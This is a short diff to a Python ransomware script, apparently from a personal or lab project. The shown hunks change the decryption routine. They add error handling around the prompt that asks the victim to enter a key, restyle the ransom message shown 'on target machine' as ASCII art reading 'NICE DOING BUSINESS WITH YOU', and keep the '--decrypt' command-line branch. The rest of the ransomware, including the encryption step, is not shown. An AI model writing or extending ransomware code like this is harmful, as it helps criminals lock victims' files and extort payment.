@@ -81,13 +81,12 @@ class Ransomware:
         mySecret.load()
         # asking for the key: loop
         while True:
-            #try:
-                tiped_key = input("Enter the key:")
-                #b64_tiped_key = base64.b64encode(tiped_key, 'utf8')
+            try:
+                tiped_key = input("Enter the key: ")
                 mySecret.set_key(bytes(tiped_key, 'utf8'))
                 break
-            #except:
-                #print("Wrong key, try again...")
+            except:
+                print("\nWrong key, try again...\n")
         
         # Listing txt files
         lfile = self.get_files('*.txt')
@@ -96,7 +95,9 @@ class Ransomware:
         # cleaning
         mySecret.clean()
         # display message on target machine
-        print("NICE TO MAKE BUSINESS WITH YOU !")
+        print("\n\t\t+-+-+-+-+  +-+-+-+-+-+  +-+-+-+-+-+-+-+-+  +-+-+-+-+  +-+-+-++-+\n\
+                |N|I|C|E|  |D|O|I|N|G|  |B|U|S|I|N|E|S|S|  |W|I|T|H|  |Y|O|U||!|\n\
+                +-+-+-+-+  +-+-+-+-+-+  +-+-+-+-+-+-+-+-+  +-+-+-+-+  +-+-+-++-+\n")
 
         return
 
@@ -109,3 +110,5 @@ if __name__ == "__main__":
     elif sys.argv[1] == "--decrypt":
         ransomware = Ransomware()
         ransomware.decrypt()
+
+
